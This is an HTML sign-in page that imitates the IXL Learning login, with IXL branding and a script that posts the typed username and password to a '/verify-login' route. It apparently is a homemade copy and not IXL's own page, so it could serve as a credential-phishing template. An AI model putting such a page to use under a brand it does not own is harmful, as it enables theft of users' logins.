<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to IXL</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f7f9fa; display: flex; flex-direction: column; min-height: 100vh; }
        header { background-color: #55b700; padding: 12px 40px; display: flex; align-items: center; border-bottom: 2px solid #489e00; }
        .logo-box { background: #ffcc00; padding: 4px 14px; border-radius: 4px; display: flex; align-items: center; cursor: pointer; text-decoration: none; }
        .logo-text { font-size: 28px; font-weight: bold; color: #000; letter-spacing: -1px; }

        .signin-container { flex-grow: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
        .signin-card { background: white; width: 100%; max-width: 420px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; }
        .signin-card h1 { color: #222; font-size: 28px; font-weight: normal; margin-top: 0; margin-bottom: 25px; text-align: center; }
        
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 13px; font-weight: bold; color: #333; margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
        .form-group input:focus { outline: none; border-color: #0070f3; box-shadow: 0 0 0 3px rgba(0,112,243,0.1); }
        
        .btn-submit { background-color: #55b700; color: white; border: none; width: 100%; padding: 14px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
        .btn-submit:hover { background-color: #489e00; }
        
        .error-msg { background: #ffeeec; color: #dc2626; padding: 10px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; text-align: center; border: 1px solid #f9cab8; display: none; }
        
        footer { background: #1e293b; color: #94a3b8; text-align: center; padding: 20px; font-size: 13px; border-top: 4px solid #55b700; }
    </style>
</head>
<body>

    <header>
        <a href="/" class="logo-box">
            <span class="logo-text">IXL</span>
        </a>
    </header>

    <div class="signin-container">
        <div class="signin-card">
            <h1>Sign in to IXL</h1>
            <div id="errorMsg" class="error-msg">Incorrect username or password. Please try again.</div>
            
            <div class="form-group">
                <label>Username or email</label>
                <input type="text" id="userInput" autocomplete="off" autofocus>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="passInput">
            </div>
            
            <button type="button" class="btn-submit" onclick="checkCredentials()">Sign in</button>
        </div>
    </div>

    <footer>
        <p>&copy; 2026 IXL Learning. All rights reserved.</p>
    </footer>

    <script>
        async function checkCredentials() {
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            const errorDiv = document.getElementById('errorMsg');

            try {
                const response = await fetch('/verify-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: user, password: pass })
                });
                const data = await response.json();
                if (data.success) {
                    window.location.href = '/learning-hub';
                } else {
                    errorDiv.style.display = 'block';
                }
            } catch (err) {
                errorDiv.style.display = 'block';
            }
        }
    </script>
</body>
</html>
